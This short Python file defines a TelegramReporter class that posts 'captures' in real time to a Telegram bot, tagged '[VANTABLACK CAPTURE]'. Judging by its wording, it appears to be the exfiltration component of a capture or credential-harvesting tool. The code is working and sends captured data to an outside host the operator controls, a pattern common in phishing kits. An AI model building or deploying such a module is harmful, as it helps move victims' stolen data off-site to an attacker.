import requests

class TelegramReporter:
    """
    CLASS: TelegramReporter
    ROLE: Sends captures in real-time to a Telegram bot.
    """
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{self.token}/sendMessage"

    def send_log(self, message):
        """SENDS a message to the Telegram bot."""
        if not self.token or not self.chat_id: return
        try:
            payload = {
                "chat_id": self.chat_id, 
                "text": f"🚀 [VANTABLACK CAPTURE]\n\n{message}", 
                "parse_mode": "Markdown"
            }
            requests.post(self.api_url, json=payload, timeout=5)
        except Exception as e:
            print(f"[!] Telegram Error: {e}")
